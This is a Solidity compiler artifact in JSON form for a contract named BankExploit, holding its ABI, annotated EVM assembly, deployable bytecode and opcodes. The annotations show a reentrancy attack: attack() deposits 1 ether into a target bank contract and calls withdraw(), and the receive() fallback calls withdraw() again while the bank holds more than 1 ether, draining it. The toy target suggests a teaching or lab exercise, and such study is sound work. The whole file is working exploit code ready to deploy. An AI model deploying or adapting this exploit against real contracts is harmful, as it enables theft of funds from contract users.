{
	"contracts/bank_exploit.sol": {
		"BankExploit": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address payable",
							"name": "_target",
							"type": "address"
						}
					],
					"stateMutability": "payable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attackerBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/bank_exploit.sol\":87:593  contract BankExploit {\r... */\n  mstore(0x40, 0x80)\n    /* \"contracts/bank_exploit.sol\":143:227  constructor(address payable _target) payable {\r... */\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_1\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n    /* \"contracts/bank_exploit.sol\":211:218  _target */\n  dup1\n    /* \"contracts/bank_exploit.sol\":199:203  bank */\n  0x00\n  dup1\n    /* \"contracts/bank_exploit.sol\":199:219  bank = Bank(_target) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/bank_exploit.sol\":143:227  constructor(address payable _target) payable {\r... */\n  pop\n    /* \"contracts/bank_exploit.sol\":87:593  contract BankExploit {\r... */\n  jump(tag_5)\n    /* \"#utility.yul\":7:166   */\ntag_7:\n    /* \"#utility.yul\":72:77   */\n  0x00\n    /* \"#utility.yul\":103:109   */\n  dup2\n    /* \"#utility.yul\":97:110   */\n  mload\n    /* \"#utility.yul\":88:110   */\n  swap1\n  pop\n    /* \"#utility.yul\":119:160   */\n  tag_9\n    /* \"#utility.yul\":154:159   */\n  dup2\n    /* \"#utility.yul\":119:160   */\n  tag_10\n  jump\t// in\ntag_9:\n    /* \"#utility.yul\":7:166   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":172:539   */\ntag_2:\n    /* \"#utility.yul\":250:256   */\n  0x00\n    /* \"#utility.yul\":299:301   */\n  0x20\n    /* \"#utility.yul\":287:296   */\n  dup3\n    /* \"#utility.yul\":278:285   */\n  dup5\n    /* \"#utility.yul\":274:297   */\n  sub\n    /* \"#utility.yul\":270:302   */\n  slt\n    /* \"#utility.yul\":267:386   */\n  iszero\n  tag_12\n  jumpi\n    /* \"#utility.yul\":305:384   */\n  tag_13\n  tag_14\n  jump\t// in\ntag_13:\n    /* \"#utility.yul\":267:386   */\ntag_12:\n    /* \"#utility.yul\":425:426   */\n  0x00\n    /* \"#utility.yul\":450:522   */\n  tag_15\n    /* \"#utility.yul\":514:521   */\n  dup5\n    /* \"#utility.yul\":505:511   */\n  dup3\n    /* \"#utility.yul\":494:503   */\n  dup6\n    /* \"#utility.yul\":490:512   */\n  add\n    /* \"#utility.yul\":450:522   */\n  tag_7\n  jump\t// in\ntag_15:\n    /* \"#utility.yul\":440:522   */\n  swap2\n  pop\n    /* \"#utility.yul\":396:532   */\n  pop\n    /* \"#utility.yul\":172:539   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":626:730   */\ntag_18:\n    /* \"#utility.yul\":671:678   */\n  0x00\n    /* \"#utility.yul\":700:724   */\n  tag_20\n    /* \"#utility.yul\":718:723   */\n  dup3\n    /* \"#utility.yul\":700:724   */\n  tag_21\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":689:724   */\n  swap1\n  pop\n    /* \"#utility.yul\":626:730   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":736:862   */\ntag_21:\n    /* \"#utility.yul\":773:780   */\n  0x00\n    /* \"#utility.yul\":813:855   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":806:811   */\n  dup3\n    /* \"#utility.yul\":802:856   */\n  and\n    /* \"#utility.yul\":791:856   */\n  swap1\n  pop\n    /* \"#utility.yul\":736:862   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":991:1108   */\ntag_14:\n    /* \"#utility.yul\":1100:1101   */\n  0x00\n    /* \"#utility.yul\":1097:1098   */\n  dup1\n    /* \"#utility.yul\":1090:1102   */\n  revert\n    /* \"#utility.yul\":1114:1252   */\ntag_10:\n    /* \"#utility.yul\":1195:1227   */\n  tag_27\n    /* \"#utility.yul\":1221:1226   */\n  dup2\n    /* \"#utility.yul\":1195:1227   */\n  tag_18\n  jump\t// in\ntag_27:\n    /* \"#utility.yul\":1188:1193   */\n  dup2\n    /* \"#utility.yul\":1185:1228   */\n  eq\n    /* \"#utility.yul\":1175:1246   */\n  tag_28\n  jumpi\n    /* \"#utility.yul\":1242:1243   */\n  0x00\n    /* \"#utility.yul\":1239:1240   */\n  dup1\n    /* \"#utility.yul\":1232:1244   */\n  revert\n    /* \"#utility.yul\":1175:1246   */\ntag_28:\n    /* \"#utility.yul\":1114:1252   */\n  pop\n  jump\t// out\n    /* \"contracts/bank_exploit.sol\":87:593  contract BankExploit {\r... */\ntag_5:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/bank_exploit.sol\":87:593  contract BankExploit {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x2b8ed6e5\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_4\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"contracts/bank_exploit.sol\":531:538  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/bank_exploit.sol\":510:514  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/bank_exploit.sol\":510:526  bank.bankBalance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x28657aa5\n        /* \"contracts/bank_exploit.sol\":510:528  bank.bankBalance() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_7\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_7:\n      pop\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_9\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_9:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n        /* \"contracts/bank_exploit.sol\":510:538  bank.bankBalance() > 1 ether */\n      gt\n        /* \"contracts/bank_exploit.sol\":507:581  if(bank.bankBalance() > 1 ether){\r... */\n      iszero\n      tag_12\n      jumpi\n        /* \"contracts/bank_exploit.sol\":554:558  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/bank_exploit.sol\":554:567  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"contracts/bank_exploit.sol\":554:569  bank.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_13\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_13:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_15\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_15:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bank_exploit.sol\":507:581  if(bank.bankBalance() > 1 ether){\r... */\n    tag_12:\n        /* \"contracts/bank_exploit.sol\":87:593  contract BankExploit {\r... */\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/bank_exploit.sol\":355:458  function attackerBalance() public view returns (uint256){\r... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/bank_exploit.sol\":239:347  function attack() public payable {\r... */\n    tag_4:\n      tag_21\n      tag_22\n      jump\t// in\n    tag_21:\n      stop\n        /* \"contracts/bank_exploit.sol\":355:458  function attackerBalance() public view returns (uint256){\r... */\n    tag_18:\n        /* \"contracts/bank_exploit.sol\":403:410  uint256 */\n      0x00\n        /* \"contracts/bank_exploit.sol\":429:450  address(this).balance */\n      selfbalance\n        /* \"contracts/bank_exploit.sol\":422:450  return address(this).balance */\n      swap1\n      pop\n        /* \"contracts/bank_exploit.sol\":355:458  function attackerBalance() public view returns (uint256){\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bank_exploit.sol\":239:347  function attack() public payable {\r... */\n    tag_22:\n        /* \"contracts/bank_exploit.sol\":283:287  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/bank_exploit.sol\":283:295  bank.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"contracts/bank_exploit.sol\":303:310  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/bank_exploit.sol\":283:313  bank.deposit{value: 1 ether}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_25\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_25:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_27\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_27:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bank_exploit.sol\":324:328  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/bank_exploit.sol\":324:337  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"contracts/bank_exploit.sol\":324:339  bank.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_28\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_28:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_30\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_30:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bank_exploit.sol\":239:347  function attack() public payable {\r... */\n      jump\t// out\n        /* \"#utility.yul\":7:150   */\n    tag_32:\n        /* \"#utility.yul\":64:69   */\n      0x00\n        /* \"#utility.yul\":95:101   */\n      dup2\n        /* \"#utility.yul\":89:102   */\n      mload\n        /* \"#utility.yul\":80:102   */\n      swap1\n      pop\n        /* \"#utility.yul\":111:144   */\n      tag_34\n        /* \"#utility.yul\":138:143   */\n      dup2\n        /* \"#utility.yul\":111:144   */\n      tag_35\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":7:150   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":156:507   */\n    tag_11:\n        /* \"#utility.yul\":226:232   */\n      0x00\n        /* \"#utility.yul\":275:277   */\n      0x20\n        /* \"#utility.yul\":263:272   */\n      dup3\n        /* \"#utility.yul\":254:261   */\n      dup5\n        /* \"#utility.yul\":250:273   */\n      sub\n        /* \"#utility.yul\":246:278   */\n      slt\n        /* \"#utility.yul\":243:362   */\n      iszero\n      tag_37\n      jumpi\n        /* \"#utility.yul\":281:360   */\n      tag_38\n      tag_39\n      jump\t// in\n    tag_38:\n        /* \"#utility.yul\":243:362   */\n    tag_37:\n        /* \"#utility.yul\":401:402   */\n      0x00\n        /* \"#utility.yul\":426:490   */\n      tag_40\n        /* \"#utility.yul\":482:489   */\n      dup5\n        /* \"#utility.yul\":473:479   */\n      dup3\n        /* \"#utility.yul\":462:471   */\n      dup6\n        /* \"#utility.yul\":458:480   */\n      add\n        /* \"#utility.yul\":426:490   */\n      tag_32\n      jump\t// in\n    tag_40:\n        /* \"#utility.yul\":416:490   */\n      swap2\n      pop\n        /* \"#utility.yul\":372:500   */\n      pop\n        /* \"#utility.yul\":156:507   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":513:631   */\n    tag_41:\n        /* \"#utility.yul\":600:624   */\n      tag_43\n        /* \"#utility.yul\":618:623   */\n      dup2\n        /* \"#utility.yul\":600:624   */\n      tag_44\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":595:598   */\n      dup3\n        /* \"#utility.yul\":588:625   */\n      mstore\n        /* \"#utility.yul\":513:631   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":637:859   */\n    tag_20:\n        /* \"#utility.yul\":730:734   */\n      0x00\n        /* \"#utility.yul\":768:770   */\n      0x20\n        /* \"#utility.yul\":757:766   */\n      dup3\n        /* \"#utility.yul\":753:771   */\n      add\n        /* \"#utility.yul\":745:771   */\n      swap1\n      pop\n        /* \"#utility.yul\":781:852   */\n      tag_46\n        /* \"#utility.yul\":849:850   */\n      0x00\n        /* \"#utility.yul\":838:847   */\n      dup4\n        /* \"#utility.yul\":834:851   */\n      add\n        /* \"#utility.yul\":825:831   */\n      dup5\n        /* \"#utility.yul\":781:852   */\n      tag_41\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":637:859   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":946:1023   */\n    tag_44:\n        /* \"#utility.yul\":983:990   */\n      0x00\n        /* \"#utility.yul\":1012:1017   */\n      dup2\n        /* \"#utility.yul\":1001:1017   */\n      swap1\n      pop\n        /* \"#utility.yul\":946:1023   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1152:1269   */\n    tag_39:\n        /* \"#utility.yul\":1261:1262   */\n      0x00\n        /* \"#utility.yul\":1258:1259   */\n      dup1\n        /* \"#utility.yul\":1251:1263   */\n      revert\n        /* \"#utility.yul\":1275:1397   */\n    tag_35:\n        /* \"#utility.yul\":1348:1372   */\n      tag_54\n        /* \"#utility.yul\":1366:1371   */\n      dup2\n        /* \"#utility.yul\":1348:1372   */\n      tag_44\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":1341:1346   */\n      dup2\n        /* \"#utility.yul\":1338:1373   */\n      eq\n        /* \"#utility.yul\":1328:1391   */\n      tag_55\n      jumpi\n        /* \"#utility.yul\":1387:1388   */\n      0x00\n        /* \"#utility.yul\":1384:1385   */\n      dup1\n        /* \"#utility.yul\":1377:1389   */\n      revert\n        /* \"#utility.yul\":1328:1391   */\n    tag_55:\n        /* \"#utility.yul\":1275:1397   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212208f6ead407d8e4ac1f452fe3a6a9bbbc66baf13852f69668e99ef744a45664aac64736f6c63430008070033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405260405161048138038061048183398181016040528101906100259190610080565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100fb565b60008151905061007a816100e4565b92915050565b600060208284031215610096576100956100df565b5b60006100a48482850161006b565b91505092915050565b60006100b8826100bf565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b6100ed816100ad565b81146100f857600080fd5b50565b6103778061010a6000396000f3fe60806040526004361061002d5760003560e01c80632b8ed6e5146101675780639e5faafc1461019257610162565b3661016257670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166328657aa56040518163ffffffff1660e01b815260040160206040518083038186803b1580156100a157600080fd5b505afa1580156100b5573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100d991906102c4565b11156101605760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561014757600080fd5b505af115801561015b573d6000803e3d6000fd5b505050505b005b600080fd5b34801561017357600080fd5b5061017c61019c565b6040516101899190610300565b60405180910390f35b61019a6101a4565b005b600047905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561021457600080fd5b505af1158015610228573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561029557600080fd5b505af11580156102a9573d6000803e3d6000fd5b50505050565b6000815190506102be8161032a565b92915050565b6000602082840312156102da576102d9610325565b5b60006102e8848285016102af565b91505092915050565b6102fa8161031b565b82525050565b600060208201905061031560008301846102f1565b92915050565b6000819050919050565b600080fd5b6103338161031b565b811461033e57600080fd5b5056fea26469706673582212208f6ead407d8e4ac1f452fe3a6a9bbbc66baf13852f69668e99ef744a45664aac64736f6c63430008070033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0x481 CODESIZE SUB DUP1 PUSH2 0x481 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x25 SWAP2 SWAP1 PUSH2 0x80 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFB JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x7A DUP2 PUSH2 0xE4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x96 JUMPI PUSH2 0x95 PUSH2 0xDF JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xA4 DUP5 DUP3 DUP6 ADD PUSH2 0x6B JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xB8 DUP3 PUSH2 0xBF JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xED DUP2 PUSH2 0xAD JUMP JUMPDEST DUP2 EQ PUSH2 0xF8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x377 DUP1 PUSH2 0x10A PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2D JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x2B8ED6E5 EQ PUSH2 0x167 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x192 JUMPI PUSH2 0x162 JUMP JUMPDEST CALLDATASIZE PUSH2 0x162 JUMPI PUSH8 0xDE0B6B3A7640000 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x28657AA5 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xA1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xB5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xD9 SWAP2 SWAP1 PUSH2 0x2C4 JUMP JUMPDEST GT ISZERO PUSH2 0x160 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x147 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x15B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x173 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x17C PUSH2 0x19C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x189 SWAP2 SWAP1 PUSH2 0x300 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x19A PUSH2 0x1A4 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x214 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x228 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x295 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2A9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x2BE DUP2 PUSH2 0x32A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2DA JUMPI PUSH2 0x2D9 PUSH2 0x325 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2E8 DUP5 DUP3 DUP6 ADD PUSH2 0x2AF JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2FA DUP2 PUSH2 0x31B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x315 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2F1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x333 DUP2 PUSH2 0x31B JUMP JUMPDEST DUP2 EQ PUSH2 0x33E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP16 PUSH15 0xAD407D8E4AC1F452FE3A6A9BBBC66B 0xAF SGT DUP6 0x2F PUSH10 0x668E99EF744A45664AAC PUSH5 0x736F6C6343 STOP ADDMOD SMOD STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "177400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack()": "infinite",
						"attackerBalance()": "317"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"attackerBalance()": "2b8ed6e5"
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}